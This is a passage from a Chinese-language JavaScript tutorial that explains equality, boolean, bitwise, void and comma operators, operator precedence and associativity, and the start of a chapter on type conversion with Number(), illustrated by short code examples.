   两个复合类型（对象、数组、函数）的数据比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个地址。

   .. code:: javascript

      {} === {} // false
      [] === [] // false
      (function () {} === function () {}) // false

   上面代码分别比较两个空对象、两个空数组、两个空函数，结果都是不相等。原因是对于复合类型的值，严格相等运算比较的是，它们是否引用同一个内存地址，而运算符两边的空对象、空数组、空函数的值，都存放在不同的内存地址，结果当然是 ``false`` 。

   如果两个变量引用同一个对象，则它们相等。

   .. code:: javascript

      var v1 = {};
      var v2 = v1;
      v1 === v2 // true

   注意，对于两个对象的比较，严格相等运算符比较的是地址，而大于或小于运算符比较的是值。

   .. code:: javascript

      var obj1 = {};
      var obj2 = {};
   
      obj1 > obj2 // false
      obj1 < obj2 // false
      obj1 === obj2 // false

   上面的三个比较，前两个比较的是值，最后一个比较的是地址，所以都返回 ``false`` 。

   **（4）undefined 和 null**

    ``undefined`` 和 ``null`` 与自身严格相等。

   .. code:: javascript

      undefined === undefined // true
      null === null // true

   由于变量声明后默认值是 ``undefined`` ，因此两个只声明未赋值的变量是相等的。

   .. code:: javascript

      var v1;
      var v2;
      v1 === v2 // true

严格不相等运算符
-------------

   严格相等运算符有一个对应的“严格不相等运算符”（ ``!==`` ），它的算法就是先求严格相等运算符的结果，然后返回相反值。

   .. code:: javascript

      1 !== '1' // true
      // 等同于
      !(1 === '1')

   上面代码中，感叹号 ``!`` 是求出后面表达式的相反值。

相等运算符
--------

   相等运算符用来比较相同类型的数据时，与严格相等运算符完全一样。

   .. code:: javascript

      1 == 1.0
      // 等同于
      1 === 1.0

   比较不同类型的数据时，相等运算符会先将数据进行类型转换，然后再用严格相等运算符比较。下面分成几种情况，讨论不同类型的值互相比较的规则。

   **（1）原始类型值**

   原始类型的值会转换成数值再进行比较。

   .. code:: javascript

      1 == true // true
      // 等同于 1 === Number(true)
   
      0 == false // true
      // 等同于 0 === Number(false)
   
      2 == true // false
      // 等同于 2 === Number(true)
   
      2 == false // false
      // 等同于 2 === Number(false)
   
      'true' == true // false
      // 等同于 Number('true') === Number(true)
      // 等同于 NaN === 1
   
      '' == 0 // true
      // 等同于 Number('') === 0
      // 等同于 0 === 0
   
      '' == false  // true
      // 等同于 Number('') === Number(false)
      // 等同于 0 === 0
   
      '1' == true  // true
      // 等同于 Number('1') === Number(true)
      // 等同于 1 === 1
   
      '\n  123  \t' == 123 // true
      // 因为字符串转为数字时，省略前置和后置的空格

   上面代码将字符串和布尔值都转为数值，然后再进行比较。具体的字符串与布尔值的类型转换规则，参见《数据类型转换》一章。

   **（2）对象与原始类型值比较**

   对象（这里指广义的对象，包括数组和函数）与原始类型的值比较时，对象转换成原始类型的值，再进行比较。

   具体来说，先调用对象的 ``valueOf()`` 方法，如果得到原始类型的值，就按照上一小节的规则，互相比较；如果得到的还是对象，则再调用 ``toString()`` 方法，得到字符串形式，再进行比较。

   下面是数组与原始类型值比较的例子。

   .. code:: javascript

      // 数组与数值的比较
      [1] == 1 // true
   
      // 数组与字符串的比较
      [1] == '1' // true
      [1, 2] == '1,2' // true
   
      // 对象与布尔值的比较
      [1] == true // true
      [2] == true // false

   上面例子中，JavaScript 引擎会先对数组 ``[1]`` 调用数组的 ``valueOf()`` 方法，由于返回的还是一个数组，所以会接着调用数组的 ``toString()`` 方法，得到字符串形式，再按照上一小节的规则进行比较。

   下面是一个更直接的例子。

   .. code:: javascript

      const obj = {
        valueOf: function () {
          console.log('执行 valueOf()');
          return obj;
        },
        toString: function () {
          console.log('执行 toString()');
          return 'foo';
        }
      };
   
      obj == 'foo'
      // 执行 valueOf()
      // 执行 toString()
      // true

   上面例子中， ``obj`` 是一个自定义了 ``valueOf()`` 和 ``toString()`` 方法的对象。这个对象与字符串 ``'foo'`` 进行比较时，会依次调用 ``valueOf()`` 和 ``toString()`` 方法，最后返回 ``'foo'`` ，所以比较结果是 ``true`` 。

   **（3）undefined 和 null**

    ``undefined`` 和 ``null`` 只有与自身比较，或者互相比较时，才会返回 ``true`` ；与其他类型的值比较时，结果都为 ``false`` 。

   .. code:: javascript

      undefined == undefined // true
      null == null // true
      undefined == null // true
   
      false == null // false
      false == undefined // false
   
      0 == null // false
      0 == undefined // false

   **（4）相等运算符的缺点**

   相等运算符隐藏的类型转换，会带来一些违反直觉的结果。

   .. code:: javascript

      0 == ''             // true
      0 == '0'            // true
   
      2 == true           // false
      2 == false          // false
   
      false == 'false'    // false
      false == '0'        // true
   
      false == undefined  // false
      false == null       // false
      null == undefined   // true
   
      ' \t\r\n ' == 0     // true

   上面这些表达式都不同于直觉，很容易出错。因此建议不要使用相等运算符（ ``==`` ），最好只使用严格相等运算符（ ``===`` ）。

不相等运算符
----------

   相等运算符有一个对应的“不相等运算符”（ ``!=`` ），它的算法就是先求相等运算符的结果，然后返回相反值。

   .. code:: javascript

      1 != '1' // false
   
      // 等同于
      !(1 == '1')

/🟠 布尔运算符
=============

概述
---

   布尔运算符用于将表达式转为布尔值，一共包含四个运算符。

   - 取反运算符： ``!`` 
   - 且运算符： ``&&`` 
   - 或运算符： ``||`` 
   - 三元运算符： ``?:`` 

取反运算符（!）
-------------

   取反运算符是一个感叹号，用于将布尔值变为相反值，即 ``true`` 变成 ``false`` ， ``false`` 变成 ``true`` 。

   .. code:: javascript

      !true // false
      !false // true

   对于非布尔值，取反运算符会将其转为布尔值。可以这样记忆，以下六个值取反后为 ``true`` ，其他值都为 ``false`` 。

   -  ``undefined`` 
   -  ``null`` 
   -  ``false`` 
   -  ``0`` 
   -  ``NaN`` 
   - 空字符串（ ``''`` ）

   .. code:: javascript

      !undefined // true
      !null // true
      !0 // true
      !NaN // true
      !"" // true
   
      !54 // false
      !'hello' // false
      ![] // false
      !{} // false

   上面代码中，不管什么类型的值，经过取反运算后，都变成了布尔值。

   如果对一个值连续做两次取反运算，等于将其转为对应的布尔值，与 ``Boolean`` 函数的作用相同。这是一种常用的类型转换的写法。

   .. code:: javascript

      !!x
      // 等同于
      Boolean(x)

   上面代码中，不管 ``x`` 是什么类型的值，经过两次取反运算后，变成了与 ``Boolean`` 函数结果相同的布尔值。所以，两次取反就是将一个值转为布尔值的简便写法。

且运算符（&&）
------------

   且运算符（ ``&&`` ）往往用于多个表达式的求值。

   它的运算规则是：如果第一个运算子的布尔值为 ``true`` ，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为 ``false`` ，则直接返回第一个运算子的值，且不再对第二个运算子求值。

   .. code:: javascript

      't' && '' // ""
      't' && 'f' // "f"
      't' && (1 + 2) // 3
      '' && 'f' // ""
      '' && '' // ""
   
      var x = 1;
      (1 - 1) && ( x += 1) // 0
      x // 1

   上面代码的最后一个例子，由于且运算符的第一个运算子的布尔值为 ``false`` ，则直接返回它的值 ``0`` ，而不再对第二个运算子求值，所以变量 ``x`` 的值没变。

   这种跳过第二个运算子的机制，被称为“短路”。有些程序员喜欢用它取代 ``if`` 结构，比如下面是一段 ``if`` 结构的代码，就可以用且运算符改写。

   .. code:: javascript

      if (i) {
        doSomething();
      }
   
      // 等价于
   
      i && doSomething();

   上面代码的两种写法是等价的，但是后一种不容易看出目的，也不容易除错，建议谨慎使用。

   且运算符可以多个连用，这时返回第一个布尔值为 ``false`` 的表达式的值。如果所有表达式的布尔值都为 ``true`` ，则返回最后一个表达式的值。

   .. code:: javascript

      true && 'foo' && '' && 4 && 'foo' && true
      // ''
   
      1 && 2 && 3
      // 3

   上面代码中，例一里面，第一个布尔值为 ``false`` 的表达式为第三个表达式，所以得到一个空字符串。例二里面，所有表达式的布尔值都是 ``true`` ，所以返回最后一个表达式的值 ``3`` 。

或运算符（||）
------------

   或运算符（ ``||`` ）也用于多个表达式的求值。它的运算规则是：如果第一个运算子的布尔值为 ``true`` ，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为 ``false`` ，则返回第二个运算子的值。

   .. code:: javascript

      't' || '' // "t"
      't' || 'f' // "t"
      '' || 'f' // "f"
      '' || '' // ""

   短路规则对这个运算符也适用。

   .. code:: javascript

      var x = 1;
      true || (x = 2) // true
      x // 1

   上面代码中，或运算符的第一个运算子为 ``true`` ，所以直接返回 ``true`` ，不再运行第二个运算子。所以， ``x`` 的值没有改变。这种只通过第一个表达式的值，控制是否运行第二个表达式的机制，就称为“短路”（short-cut）。

   或运算符可以多个连用，这时返回第一个布尔值为 ``true`` 的表达式的值。如果所有表达式都为 ``false`` ，则返回最后一个表达式的值。

   .. code:: javascript

      false || 0 || '' || 4 || 'foo' || true
      // 4
   
      false || 0 || ''
      // ''

   上面代码中，例一里面，第一个布尔值为 ``true`` 的表达式是第四个表达式，所以得到数值4。例二里面，所有表达式的布尔值都为 ``false`` ，所以返回最后一个表达式的值。

   或运算符常用于为一个变量设置默认值。

   .. code:: javascript

      function saveText(text) {
        text = text || '';
        // ...
      }
   
      // 或者写成
      saveText(this.text || '')

   上面代码表示，如果函数调用时，没有提供参数，则该参数默认设置为空字符串。

三元条件运算符（?:）
-----------------

   三元条件运算符由问号（?）和冒号（:）组成，分隔三个表达式。它是 JavaScript 语言唯一一个需要三个运算子的运算符。如果第一个表达式的布尔值为 ``true`` ，则返回第二个表达式的值，否则返回第三个表达式的值。

   .. code:: javascript

      't' ? 'hello' : 'world' // "hello"
      0 ? 'hello' : 'world' // "world"

   上面代码的 ``t`` 和 ``0`` 的布尔值分别为 ``true`` 和 ``false`` ，所以分别返回第二个和第三个表达式的值。

   通常来说，三元条件表达式与 ``if...else`` 语句具有同样表达效果，前者可以表达的，后者也能表达。但是两者具有一个重大差别， ``if...else`` 是语句，没有返回值；三元条件表达式是表达式，具有返回值。所以，在需要返回值的场合，只能使用三元条件表达式，而不能使用 ``if..else`` 。

   .. code:: javascript

      console.log(true ? 'T' : 'F');

   上面代码中， ``console.log`` 方法的参数必须是一个表达式，这时就只能使用三元条件表达式。如果要用 ``if...else`` 语句，就必须改变整个代码写法了。

/🟠 二进制位运算符
================

概述
---

   二进制位运算符用于直接对二进制位进行计算，一共有7个。

   - **二进制或运算符**（or）：符号为 ``|`` ，表示若两个二进制位都为 ``0`` ，则结果为 ``0`` ，否则为 ``1`` 。
   - **二进制与运算符**（and）：符号为 ``&`` ，表示若两个二进制位都为1，则结果为1，否则为0。
   - **二进制否运算符**（not）：符号为 ``~`` ，表示对一个二进制位取反。
   - **异或运算符**（xor）：符号为 ``^`` ，表示若两个二进制位不相同，则结果为1，否则为0。
   - **左移运算符**（left shift）：符号为 ``<<`` ，详见下文解释。
   - **右移运算符**（right shift）：符号为 ``>>`` ，详见下文解释。
   - **头部补零的右移运算符**（zero filled right shift）：符号为 ``>>>`` ，详见下文解释。

   这些位运算符直接处理每一个比特位（bit），所以是非常底层的运算，好处是速度极快，缺点是很不直观，许多场合不能使用它们，否则会使代码难以理解和查错。

   有一点需要特别注意，位运算符只对整数起作用，如果一个运算子不是整数，会自动转为整数后再执行。另外，虽然在 JavaScript 内部，数值都是以64位浮点数的形式储存，但是做位运算的时候，是以32位带符号的整数进行运算的，并且返回值也是一个32位带符号的整数。

   .. code:: javascript

      i = i | 0;

   上面这行代码的意思，就是将 ``i`` （不管是整数或小数）转为32位整数。

   利用这个特性，可以写出一个函数，将任意数值转为32位整数。

   .. code:: javascript

      function toInt32(x) {
        return x | 0;
      }

   上面这个函数将任意值与 ``0`` 进行一次或运算，这个位运算会自动将一个值转为32位整数。下面是这个函数的用法。

   .. code:: javascript

      toInt32(1.001) // 1
      toInt32(1.999) // 1
      toInt32(1) // 1
      toInt32(-1) // -1
      toInt32(Math.pow(2, 32) + 1) // 1
      toInt32(Math.pow(2, 32) - 1) // -1

   上面代码中， ``toInt32`` 可以将小数转为整数。对于一般的整数，返回值不会有任何变化。对于大于或等于2的32次方的整数，大于32位的数位都会被舍去。

二进制或运算符
------------

   二进制或运算符（ ``|`` ）逐位比较两个运算子，两个二进制位之中只要有一个为 ``1`` ，就返回 ``1`` ，否则返回 ``0`` 。

   .. code:: javascript

      0 | 3 // 3

   上面代码中， ``0`` 和 ``3`` 的二进制形式分别是 ``00`` 和 ``11`` ，所以进行二进制或运算会得到 ``11`` （即 ``3`` ）。

   位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与 ``0`` 进行二进制或运算，等同于对该数去除小数部分，即取整数位。

   .. code:: javascript

      2.9 | 0 // 2
      -2.9 | 0 // -2

   需要注意的是，这种取整方法不适用超过32位整数最大值 ``2147483647`` 的数。

   .. code:: javascript

      2147483649.4 | 0;
      // -2147483647

二进制与运算符
------------

   二进制与运算符（ ``&`` ）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为 ``0`` ，就返回 ``0`` ，否则返回 ``1`` 。

   .. code:: javascript

      0 & 3 // 0

   上面代码中，0（二进制 ``00`` ）和3（二进制 ``11`` ）进行二进制与运算会得到 ``00`` （即 ``0`` ）。

二进制否运算符
------------

   二进制否运算符（ ``~`` ）将每个二进制位都变为相反值（ ``0`` 变为 ``1`` ， ``1`` 变为 ``0`` ）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。

   .. code:: javascript

      ~ 3 // -4

   上面表达式对 ``3`` 进行二进制否运算，得到 ``-4`` 。之所以会有这样的结果，是因为位运算时，JavaScript 内部将所有的运算子都转为32位的二进制整数再进行运算。

    ``3`` 的32位整数形式是 ``00000000000000000000000000000011`` ，二进制否运算以后得到 ``11111111111111111111111111111100`` 。由于第一位（符号位）是1，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去1，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去1等于 ``11111111111111111111111111111011`` ，再取一次反得到 ``00000000000000000000000000000100`` ，再加上负号就是 ``-4`` 。考虑到这样的过程比较麻烦，可以简单记忆成，一个数与自身的取反值相加，等于-1。

   .. code:: javascript

      ~ -3 // 2

   上面表达式可以这样算， ``-3`` 的取反值等于 ``-1`` 减去 ``-3`` ，结果为 ``2`` 。

   对一个整数连续两次二进制否运算，得到它自身。

   .. code:: javascript

      ~~3 // 3

   所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分。所以，对一个小数连续进行两次二进制否运算，能达到取整效果。

   .. code:: javascript

      ~~2.9 // 2
      ~~47.11 // 47
      ~~1.9999 // 1
      ~~3 // 3

   使用二进制否运算取整，是所有取整方法中最快的一种。

   对字符串进行二进制否运算，JavaScript 引擎会先调用 ``Number`` 函数，将字符串转为数值。

   .. code:: javascript

      // 相当于~Number('011')
      ~'011'  // -12
   
      // 相当于~Number('42 cats')
      ~'42 cats' // -1
   
      // 相当于~Number('0xcafebabe')
      ~'0xcafebabe' // 889275713
   
      // 相当于~Number('deadbeef')
      ~'deadbeef' // -1

    ``Number`` 函数将字符串转为数值的规则，参见《数据的类型转换》一章。

   对于其他类型的值，二进制否运算也是先用 ``Number`` 转为数值，然后再进行处理。

   .. code:: javascript

      // 相当于 ~Number([])
      ~[] // -1
   
      // 相当于 ~Number(NaN)
      ~NaN // -1
   
      // 相当于 ~Number(null)
      ~null // -1

异或运算符
--------

   异或运算（ ``^`` ）在两个二进制位不同时返回 ``1`` ，相同时返回 ``0`` 。

   .. code:: javascript

      0 ^ 3 // 3

   上面表达式中， ``0`` （二进制 ``00`` ）与 ``3`` （二进制 ``11`` ）进行异或运算，它们每一个二进制位都不同，所以得到 ``11`` （即 ``3`` ）。

   “异或运算”有一个特殊运用，连续对两个数 ``a`` 和 ``b`` 进行三次异或运算， ``a^=b; b^=a; a^=b;`` ，可以[互换](http://en.wikipedia.org/wiki/XOR_swap_algorithm)它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值。

   .. code:: javascript

      var a = 10;
      var b = 99;
   
      a ^= b, b ^= a, a ^= b;
   
      a // 99
      b // 10

   这是互换两个变量的值的最快方法。

   异或运算也可以用来取整。

   .. code:: javascript

      12.9 ^ 0 // 12

左移运算符
--------

   左移运算符（ ``<<`` ）表示将一个数的二进制值向左移动指定的位数，尾部补 ``0`` ，即乘以 ``2`` 的指定次方。向左移动的时候，最高位的符号位是一起移动的。

   .. code:: javascript

      // 4 的二进制形式为100，
      // 左移一位为1000（即十进制的8）
      // 相当于乘以2的1次方
      4 << 1
      // 8
   
      -4 << 1
      // -8

   上面代码中， ``-4`` 左移一位得到 ``-8`` ，是因为 ``-4`` 的二进制形式是 ``11111111111111111111111111111100`` ，左移一位后得到 ``11111111111111111111111111111000`` ，该数转为十进制（减去1后取反，再加上负号）即为 ``-8`` 。

   如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效。

   .. code:: javascript

      13.5 << 0
      // 13
   
      -13.5 << 0
      // -13

   左移运算符用于二进制数值非常方便。

   .. code:: javascript

      var color = {r: 186, g: 218, b: 85};
   
      // RGB to HEX
      // (1 << 24)的作用为保证结果是6位数
      var rgb2hex = function(r, g, b) {
        return '#' + ((1 << 24) + (r << 16) + (g << 8) + b)
          .toString(16) // 先转成十六进制，然后返回字符串
          .substr(1);   // 去除字符串的最高位，返回后面六个字符串
      }
   
      rgb2hex(color.r, color.g, color.b)
      // "#bada55"

   上面代码使用左移运算符，将颜色的 RGB 值转为 HEX 值。

右移运算符
--------

   右移运算符（ ``>>`` ）表示将一个数的二进制值向右移动指定的位数。如果是正数，头部全部补 ``0`` ；如果是负数，头部全部补 ``1`` 。右移运算符基本上相当于除以 ``2`` 的指定次方（最高位即符号位参与移动）。

   .. code:: javascript

      4 >> 1
      // 2
      /*
      // 因为4的二进制形式为 00000000000000000000000000000100，
      // 右移一位得到 00000000000000000000000000000010，
      // 即为十进制的2
      */
   
      -4 >> 1
      // -2
      /*
      // 因为-4的二进制形式为 11111111111111111111111111111100，
      // 右移一位，头部补1，得到 11111111111111111111111111111110,
      // 即为十进制的-2
      */

   右移运算可以模拟 2 的整除运算。

   .. code:: javascript

      5 >> 1
      // 2
      // 相当于 5 / 2 = 2
   
      21 >> 2
      // 5
      // 相当于 21 / 4 = 5
   
      21 >> 3
      // 2
      // 相当于 21 / 8 = 2
   
      21 >> 4
      // 1
      // 相当于 21 / 16 = 1

头部补零的右移运算符
----------------

   头部补零的右移运算符（ ``>>>`` ）与右移运算符（ ``>>`` ）只有一个差别，就是一个数的二进制形式向右移动时，头部一律补零，而不考虑符号位。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（ ``>>`` ）完全一致，区别主要在于负数。

   .. code:: javascript

      4 >>> 1
      // 2
   
      -4 >>> 1
      // 2147483646
      /*
      // 因为-4的二进制形式为11111111111111111111111111111100，
      // 带符号位的右移一位，得到01111111111111111111111111111110，
      // 即为十进制的2147483646。
      */

   这个运算实际上将一个值转为32位无符号整数。

   查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符。

   .. code:: javascript

      -1 >>> 0 // 4294967295

   上面代码表示， ``-1`` 作为32位整数时，内部的储存形式使用无符号整数格式解读，值为 4294967295（即 ``(2^32)-1`` ，等于 ``11111111111111111111111111111111`` ）。

开关作用
-------

   位运算符可以用作设置对象属性的开关。

   假定某个对象有四个开关，每个开关都是一个变量。那么，可以设置一个四位的二进制数，它的每个位对应一个开关。

   .. code:: javascript

      var FLAG_A = 1; // 0001
      var FLAG_B = 2; // 0010
      var FLAG_C = 4; // 0100
      var FLAG_D = 8; // 1000

   上面代码设置 A、B、C、D 四个开关，每个开关分别占有一个二进制位。

   然后，就可以用二进制与运算，检查当前设置是否打开了指定开关。

   .. code:: javascript

      var flags = 5; // 二进制的0101
   
      if (flags & FLAG_C) {
        // ...
      }
      // 0101 & 0100 => 0100 => true

   上面代码检验是否打开了开关 ``C`` 。如果打开，会返回 ``true`` ，否则返回 ``false`` 。

   现在假设需要打开 ``A`` 、 ``B`` 、 ``D`` 三个开关，我们可以构造一个掩码变量。

   .. code:: javascript

      var mask = FLAG_A | FLAG_B | FLAG_D;
      // 0001 | 0010 | 1000 => 1011

   上面代码对 ``A`` 、 ``B`` 、 ``D`` 三个变量进行二进制或运算，得到掩码值为二进制的 ``1011`` 。

   有了掩码，二进制或运算可以确保打开指定的开关。

   .. code:: javascript

      flags = flags | mask;

   上面代码中，计算后得到的 ``flags`` 变量，代表三个开关的二进制位都打开了。

   二进制与运算可以将当前设置中凡是与开关设置不一样的项，全部关闭。

   .. code:: javascript

      flags = flags & mask;

   异或运算可以切换（toggle）当前设置，即第一次执行可以得到当前设置的相反值，再执行一次又得到原来的值。

   .. code:: javascript

      flags = flags ^ mask;

   二进制否运算可以翻转当前设置，即原设置为 ``0`` ，运算后变为 ``1`` ；原设置为 ``1`` ，运算后变为 ``0`` 。

   .. code:: javascript

      flags = ~flags;

参考链接
-------

   - Michal Budzynski, [JavaScript: The less known parts. Bitwise Operators](https://michalbe.blogspot.com/2013/03/javascript-less-known-parts-bitwise.html)
   - Axel Rauschmayer, [Basic JavaScript for the impatient programmer](http://www.2ality.com/2013/06/basic-javascript.html)
   - Mozilla Developer Network, [Bitwise Operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators)

/🟠 其他运算符，运算顺序
=====================

void 运算符
----------

    ``void`` 运算符的作用是执行一个表达式，然后不返回任何值，或者说返回 ``undefined`` 。

   .. code:: javascript

      void 0 // undefined
      void(0) // undefined

   上面是 ``void`` 运算符的两种写法，都正确。建议采用后一种形式，即总是使用圆括号。因为 ``void`` 运算符的优先性很高，如果不使用括号，容易造成错误的结果。比如， ``void 4 + 7`` 实际上等同于 ``(void 4) + 7`` 。

   下面是 ``void`` 运算符的一个例子。

   .. code:: javascript

      var x = 3;
      void (x = 5) //undefined
      x // 5

   这个运算符的主要用途是浏览器的书签工具（Bookmarklet），以及在超级链接中插入代码防止网页跳转。

   请看下面的代码。

   .. code:: html

      <script>
      function f() {
        console.log('Hello World');
      }
      </script>
      <a href="http://example.com" onclick="f(); return false;">点击</a>

   上面代码中，点击链接后，会先执行 ``onclick`` 的代码，由于 ``onclick`` 返回 ``false`` ，所以浏览器不会跳转到 example.com。

    ``void`` 运算符可以取代上面的写法。

   .. code:: html

      <a href="javascript: void(f())">文字</a>

   下面是一个更实际的例子，用户点击链接提交表单，但是不产生页面跳转。

   .. code:: html

      <a href="javascript: void(document.form.submit())">
        提交
      </a>

逗号运算符
--------

   逗号运算符用于对两个表达式求值，并返回后一个表达式的值。

   .. code:: javascript

      'a', 'b' // "b"
   
      var x = 0;
      var y = (x++, 10);
      x // 1
      y // 10

   上面代码中，逗号运算符返回后一个表达式的值。

   逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作。

   .. code:: javascript

      var value = (console.log('Hi!'), true);
      // Hi!
   
      value // true

   上面代码中，先执行逗号之前的操作，然后返回逗号后面的值。

运算顺序
-------


优先级
~~~~~

   JavaScript 各种运算符的优先级别（Operator Precedence）是不一样的。优先级高的运算符先执行，优先级低的运算符后执行。

   .. code:: javascript

      4 + 5 * 6 // 34

   上面的代码中，乘法运算符（ ``*`` ）的优先性高于加法运算符（ ``+`` ），所以先执行乘法，再执行加法，相当于下面这样。

   .. code:: javascript

      4 + (5 * 6) // 34

   如果多个运算符混写在一起，常常会导致令人困惑的代码。

   .. code:: javascript

      var x = 1;
      var arr = [];
   
      var y = arr.length <= 0 || arr[0] === undefined ? x : arr[0];

   上面代码中，变量 ``y`` 的值就很难看出来，因为这个表达式涉及5个运算符，到底谁的优先级最高，实在不容易记住。

   根据语言规格，这五个运算符的优先级从高到低依次为：小于等于（ ``<=`` )、严格相等（ ``===`` ）、或（ ``||`` ）、三元（ ``?:`` ）、等号（ ``=`` ）。因此上面的表达式，实际的运算顺序如下。

   .. code:: javascript

      var y = ((arr.length <= 0) || (arr[0] === undefined)) ? x : arr[0];

   记住所有运算符的优先级，是非常难的，也是没有必要的。

圆括号的作用
~~~~~~~~~~

   圆括号（ ``()`` ）可以用来提高运算的优先级，因为它的优先级是最高的，即圆括号中的表达式会第一个运算。

   .. code:: javascript

      (4 + 5) * 6 // 54

   上面代码中，由于使用了圆括号，加法会先于乘法执行。

   运算符的优先级别十分繁杂，且都是硬性规定，因此建议总是使用圆括号，保证运算顺序清晰可读，这对代码的维护和除错至关重要。

   顺便说一下，圆括号不是运算符，而是一种语法结构。它一共有两种用法：一种是把表达式放在圆括号之中，提升运算的优先级；另一种是跟在函数的后面，作用是调用函数。

   注意，因为圆括号不是运算符，所以不具有求值作用，只改变运算的优先级。

   .. code:: javascript

      var x = 1;
      (x) = 2;

   上面代码的第二行，如果圆括号具有求值作用，那么就会变成 ``1 = 2`` ，这是会报错了。但是，上面的代码可以运行，这验证了圆括号只改变优先级，不会求值。

   这也意味着，如果整个表达式都放在圆括号之中，那么不会有任何效果。

   .. code:: javascript

      (expression)
      // 等同于
      expression

   函数放在圆括号中，会返回函数本身。如果圆括号紧跟在函数的后面，就表示调用函数。

   .. code:: javascript

      function f() {
        return 1;
      }
   
      (f) // function f(){return 1;}
      f() // 1

   上面代码中，函数放在圆括号之中会返回函数本身，圆括号跟在函数后面则是调用函数。

   圆括号之中，只能放置表达式，如果将语句放在圆括号之中，就会报错。

   .. code:: javascript

      (var a = 1)
      // SyntaxError: Unexpected token var

左结合与右结合
~~~~~~~~~~~~

   对于优先级别相同的运算符，同时出现的时候，就会有计算顺序的问题。

   .. code:: javascript

      a OP b OP c

   上面代码中， ``OP`` 表示运算符。它可以有两种解释方式。

   .. code:: javascript

      // 方式一
      (a OP b) OP c
   
      // 方式二
      a OP (b OP c)

   上面的两种方式，得到的计算结果往往是不一样的。方式一是将左侧两个运算数结合在一起，采用这种解释方式的运算符，称为“左结合”（left-to-right associativity）运算符；方式二是将右侧两个运算数结合在一起，这样的运算符称为“右结合”运算符（right-to-left associativity）。

   JavaScript 语言的大多数运算符是“左结合”，请看下面加法运算符的例子。

   .. code:: javascript

      x + y + z
   
      // 引擎解释如下
      (x + y) + z

   上面代码中， ``x`` 与 ``y`` 结合在一起，它们的预算结果再与 ``z`` 进行运算。

   少数运算符是“右结合”，其中最主要的是赋值运算符（ ``=`` ）和三元条件运算符（ ``?:`` ）。

   .. code:: javascript

      w = x = y = z;
      q = a ? b : c ? d : e ? f : g;

   上面代码的解释方式如下。

   .. code:: javascript

      w = (x = (y = z));
      q = a ? b : (c ? d : (e ? f : g));

   上面的两行代码，都是右侧的运算数结合在一起。

   另外，指数运算符（ ``**`` ）也是右结合。

   .. code:: javascript

      2 ** 3 ** 2
      // 相当于 2 ** (3 ** 2)
      // 512



/🟡4. 语法专题
================================================================================

/🟠 数据类型的转换
================


概述
---

   JavaScript 是一种动态类型语言，变量没有类型限制，可以随时赋予任意值。

   .. code:: javascript

      var x = y ? 1 : 'a';

   上面代码中，变量 ``x`` 到底是数值还是字符串，取决于另一个变量 ``y`` 的值。 ``y`` 为 ``true`` 时， ``x`` 是一个数值； ``y`` 为 ``false`` 时， ``x`` 是一个字符串。这意味着， ``x`` 的类型没法在编译阶段就知道，必须等到运行时才能知道。

   虽然变量的数据类型是不确定的，但是各种运算符对数据类型是有要求的。如果运算符发现，运算子的类型与预期不符，就会自动转换类型。比如，减法运算符预期左右两侧的运算子应该是数值，如果不是，就会自动将它们转为数值。

   .. code:: javascript

      '4' - '3' // 1

   上面代码中，虽然是两个字符串相减，但是依然会得到结果数值 ``1`` ，原因就在于 JavaScript 将运算子自动转为了数值。

   本章讲解数据类型自动转换的规则。在此之前，先讲解如何手动强制转换数据类型。

强制转换
-------

   强制转换主要指使用 ``Number()`` 、 ``String()`` 和 ``Boolean()`` 三个函数，手动将各种类型的值，分别转换成数字、字符串或者布尔值。

Number()
~~~~~~~~~

   使用 ``Number`` 函数，可以将任意类型的值转化成数值。

   下面分成两种情况讨论，一种是参数是原始类型的值，另一种是参数是对象。

   **（1）原始类型值**

   原始类型值的转换规则如下。

   .. code:: javascript

      // 数值：转换后还是原来的值
      Number(324) // 324
   
      // 字符串：如果可以被解析为数值，则转换为相应的数值
      Number('324') // 324
   
      // 字符串：如果不可以被解析为数值，返回 NaN
      Number('324abc') // NaN
   
      // 空字符串转为0
      Number('') // 0
   
      // 布尔值：true 转成 1，false 转成 0
      Number(true) // 1
      Number(false) // 0
   
      // undefined：转成 NaN
      Number(undefined) // NaN
   
      // null：转成0
      Number(null) // 0

    ``Number`` 函数将字符串转为数值，要比 ``parseInt`` 函数严格很多。基本上，只要有一个字符无法转成数值，整个字符串就会被转为 ``NaN`` 。

   .. code:: javascript

      parseInt('42 cats') // 42
      Number('42 cats') // NaN

   上面代码中， ``parseInt`` 逐个解析字符，而 ``Number`` 函数整体转换字符串的类型。

   另外， ``parseInt`` 和 ``Number`` 函数都会自动过滤一个字符串前导和后缀的空格。

   .. code:: javascript

      parseInt('\t\v\r12.34\n') // 12
      Number('\t\v\r12.34\n') // 12.34

   **（2）对象**

   简单的规则是， ``Number`` 方法的参数是对象时，将返回 ``NaN`` ，除非是包含单个数值的数组。

   .. code:: javascript

      Number({a: 1}) // NaN
      Number([1, 2, 3]) // NaN
      Number([5]) // 5

   之所以会这样，是因为 ``Number`` 背后的转换规则比较复杂。

   第一步，调用对象自身的 ``valueOf`` 方法。如果返回原始类型的值，则直接对该值使用 ``Number`` 函数，不再进行后续步骤。

   第二步，如果 ``valueOf`` 方法返回的还是对象，则改为调用对象自身的 ``toString`` 方法。如果 ``toString`` 方法返回原始类型的值，则对该值使用 ``Number`` 函数，不再进行后续步骤。

   第三步，如果 ``toString`` 方法返回的是对象，就报错。

   请看下面的例子。

   .. code:: javascript

      var obj = {x: 1};
      Number(obj) // NaN
   
      // 等同于
      if (typeof obj.valueOf() === 'object') {
        Number(obj.toString());
      } else {
        Number(obj.valueOf());
      }

